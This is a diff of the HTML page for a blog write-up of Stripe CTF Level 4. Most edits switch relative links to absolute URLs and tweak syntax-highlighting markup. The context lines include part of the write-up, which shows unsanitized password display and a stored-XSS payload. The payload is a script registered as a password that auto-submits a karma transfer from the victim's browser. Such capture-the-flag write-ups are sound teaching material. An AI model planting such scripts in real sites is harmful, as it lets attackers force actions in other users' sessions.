@@ -2,10 +2,10 @@
 <html lang="en">
 <head>
   <link href='//fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,700,400italic' rel='stylesheet' type='text/css'>
-  <link rel="stylesheet" type="text/css" href="../../../../../theme/css/style.min.css">
-  <link rel="stylesheet" type="text/css" href="../../../../../theme/css/pygments.min.css">
-  <link rel="stylesheet" type="text/css" href="../../../../../theme/css/font-awesome.min.css">
-  <link href="../../../../..//extras/style.css" rel="stylesheet">
+  <link rel="stylesheet" type="text/css" href="https://allyourbase.utouch.fr/theme/css/style.min.css">
+  <link rel="stylesheet" type="text/css" href="https://allyourbase.utouch.fr/theme/css/pygments.min.css">
+  <link rel="stylesheet" type="text/css" href="https://allyourbase.utouch.fr/theme/css/font-awesome.min.css">
+  <link href="https://allyourbase.utouch.fr//extras/style.css" rel="stylesheet">
   <link href="https://allyourbase.utouch.fr/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="All Your Base Are Belong To Me Atom">
   <link rel="shortcut icon" href="/extras/favicon.ico" type="image/x-icon">
   <link rel="icon" href="/extras/favicon.ico" type="image/x-icon">
@@ -14,27 +14,27 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta name="robots" content="" />
 <meta name="author" content="useless" />
-<meta name="description" content="You can find the code for this level here. (sha256: 07a8338f0ecf92537daedb60709cd8211a790a23f9c25a101e069614b32da2a8) This level wants you to spread joy over the world. You have a certain amount of karma you can distribute to people. But to be sure that you only send karma to people you really trust to be good ..." />
+<meta name="description" content="You can find the code for this level here. (sha256: 07a8338f0ecf92537daedb60709cd8211a790a23f9c25a101e069614b32da2a8) This level wants you to spread joy over the world. You have a certain amount of karma you can distribute to people. But to be sure that you only send karma to people you really trust to be good …" />
 <meta name="keywords" content="">
 <meta property="og:site_name" content="All Your Base Are Belong To Me"/>
 <meta property="og:title" content="Stripe CTF: Level #4"/>
-<meta property="og:description" content="You can find the code for this level here. (sha256: 07a8338f0ecf92537daedb60709cd8211a790a23f9c25a101e069614b32da2a8) This level wants you to spread joy over the world. You have a certain amount of karma you can distribute to people. But to be sure that you only send karma to people you really trust to be good ..."/>
+<meta property="og:description" content="You can find the code for this level here. (sha256: 07a8338f0ecf92537daedb60709cd8211a790a23f9c25a101e069614b32da2a8) This level wants you to spread joy over the world. You have a certain amount of karma you can distribute to people. But to be sure that you only send karma to people you really trust to be good …"/>
 <meta property="og:locale" content="en_US"/>
-<meta property="og:url" content="../../../../../posts/2012/10/27/stripe-ctf-level-4/"/>
+<meta property="og:url" content="https://allyourbase.utouch.fr/posts/2012/10/27/stripe-ctf-level-4/"/>
 <meta property="og:type" content="article"/>
 <meta property="article:published_time" content="2012-10-27 14:22:00+02:00"/>
 <meta property="article:modified_time" content=""/>
-<meta property="article:author" content="../../../../../author/useless.html">
+<meta property="article:author" content="https://allyourbase.utouch.fr/author/useless.html">
 <meta property="article:section" content="Write-up"/>
 <meta property="og:image" content="/images/useless_profile_pic.jpg">  <title>All Your Base Are Belong To Me &ndash; Stripe CTF: Level #4</title>
 </head>
 <body>
   <aside>
     <div>
-      <a href="../../../../..">
+      <a href="https://allyourbase.utouch.fr">
         <img src="/images/useless_profile_pic.jpg" alt="All Your Base Are Belong To Me" title="All Your Base Are Belong To Me">
       </a>
-      <h1><a href="../../../../..">All Your Base Are Belong To Me</a></h1>
+      <h1><a href="https://allyourbase.utouch.fr">All Your Base Are Belong To Me</a></h1>
       <p>You know, if that's alright with you</p>
       <nav>
         <ul class="list">
@@ -49,7 +49,7 @@
   </aside>
   <main>
     <nav>
-      <a href="../../../../..">Home</a>
+      <a href="https://allyourbase.utouch.fr">Home</a>
       <a href="/archives.html">Archives</a>
       <a href="/categories.html">Categories</a>
       <a href="https://allyourbase.utouch.fr/feeds/all.atom.xml">Atom</a>
@@ -58,7 +58,7 @@
 <article>
   <header>
     <h1 id="stripe-ctf-level-4">Stripe CTF: Level #4</h1>
-    <p>Posted on sam. 27 octobre 2012 in <a href="../../../../../category/write-up.html">Write-up</a></p>
+    <p>Posted on sam. 27 octobre 2012 in <a href="https://allyourbase.utouch.fr/category/write-up.html">Write-up</a></p>
   </header>
   <div>
     <img alt="level04-logo.jpg" class="align-center" src="/images/stripe-ctf-level-4/level04-logo.jpg" />
@@ -82,7 +82,7 @@ offer some kind of internal messaging, we don't have an email address...
 All we can do is send karma_fountain some karma. Then, he'll see our
 password on his profile page. Hmmm, our password will be written to its
 profile page:</p>
-<div class="highlight"><pre><span class="c1"># File views/home.erb, line 52</span>
+<div class="highlight"><pre><span></span><span class="c1"># File views/home.erb, line 52</span>
 <span class="o">&lt;</span><span class="sx">% @registered_users.each </span><span class="k">do</span> <span class="o">|</span> <span class="n">user</span> <span class="o">|</span> <span class="sx">%&gt;</span>
 <span class="sx">&lt;% last_active = user[:last_active].strftime(&#39;%H:%M:%S UTC&#39;) %&gt;</span>
 <span class="o">&lt;</span><span class="sx">% if </span><span class="vi">@trusts_me</span><span class="o">.</span><span class="n">include?</span><span class="p">(</span><span class="n">user</span><span class="o">[</span><span class="ss">:username</span><span class="o">]</span><span class="p">)</span> <span class="sx">%&gt;</span>
@@ -93,7 +93,7 @@ profile page:</p>
 </pre></div>
 <p>The password is not sanitized before it is displayed. Is it before it's
 registered in the database?</p>
-<div class="highlight"><pre><span class="c1"># File srv.rb, line 168</span>
+<div class="highlight"><pre><span></span><span class="c1"># File srv.rb, line 168</span>
 <span class="no">DB</span><span class="o">.</span><span class="n">conn</span><span class="o">[</span><span class="ss">:users</span><span class="o">].</span><span class="n">insert</span><span class="p">(</span>
     <span class="ss">:username</span> <span class="o">=&gt;</span> <span class="n">username</span><span class="p">,</span>
     <span class="ss">:password</span> <span class="o">=&gt;</span> <span class="n">password</span><span class="p">,</span>
@@ -107,7 +107,7 @@ will be embedded in karma_fountain's page. If this javascript tells
 karma_fountain's browser to send us karma, its password will be
 displayed on our home page.</p>
 <p>So, let's create a user evil_hacker, with the following password:</p>
-<div class="highlight"><pre><span class="nt">&lt;script&gt;</span>
+<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
     <span class="kd">var</span> <span class="nx">form</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">&quot;form&quot;</span><span class="p">);</span>
     <span class="nx">form</span><span class="p">.</span><span class="nx">setAttribute</span><span class="p">(</span><span class="s2">&quot;method&quot;</span><span class="p">,</span> <span class="s2">&quot;post&quot;</span><span class="p">);</span>
     <span class="nx">form</span><span class="p">.</span><span class="nx">setAttribute</span><span class="p">(</span><span class="s2">&quot;action&quot;</span><span class="p">,</span> <span class="s2">&quot;transfer&quot;</span><span class="p">);</span>
@@ -123,7 +123,7 @@ displayed on our home page.</p>
     <span class="nx">form</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">amount_field</span><span class="p">);</span>
     <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">form</span><span class="p">);</span>
     <span class="nx">form</span><span class="p">.</span><span class="nx">submit</span><span class="p">();</span>
-<span class="nt">&lt;/script&gt;</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
 </pre></div>
 <p>Okay, I know this code is way too long, but javascript is really not my
 strong suit. Plus, there is the problem that once karma_fountain's
@@ -147,7 +147,7 @@ look at its profile page every five minutes). Let's look at our profile:</p>
 
     <footer>
 <p>
-  &copy; Yannick Méheut 2017 - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/">Creative Commons Attribution-ShareAlike 4.0 International License</a>
+  &copy; Yannick Méheut 2020 - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/">Creative Commons Attribution-ShareAlike 4.0 International License</a>
 </p>
 <p>Built using <a href="http://getpelican.com" target="_blank">Pelican</a> - <a href="https://github.com/alexandrevicenzi/flex" target="_blank">Flex</a> theme by <a href="http://alexandrevicenzi.com" target="_blank">Alexandre Vicenzi</a></p><p>
   <a rel="license"
@@ -173,11 +173,11 @@ look at its profile page every five minutes). Let's look at our profile:</p>
   "author": {
     "@type": "Person",
     "name": "useless",
-    "url": "../../../../../author/useless.html"
+    "url": "https://allyourbase.utouch.fr/author/useless.html"
   },
   "image": "/images/useless_profile_pic.jpg",
-  "url": "../../../../../posts/2012/10/27/stripe-ctf-level-4/",
-  "description": "You can find the code for this level here. (sha256: 07a8338f0ecf92537daedb60709cd8211a790a23f9c25a101e069614b32da2a8) This level wants you to spread joy over the world. You have a certain amount of karma you can distribute to people. But to be sure that you only send karma to people you really trust to be good ..."
+  "url": "https://allyourbase.utouch.fr/posts/2012/10/27/stripe-ctf-level-4/",
+  "description": "You can find the code for this level here. (sha256: 07a8338f0ecf92537daedb60709cd8211a790a23f9c25a101e069614b32da2a8) This level wants you to spread joy over the world. You have a certain amount of karma you can distribute to people. But to be sure that you only send karma to people you really trust to be good …"
 }
 </script></body>
 </html>
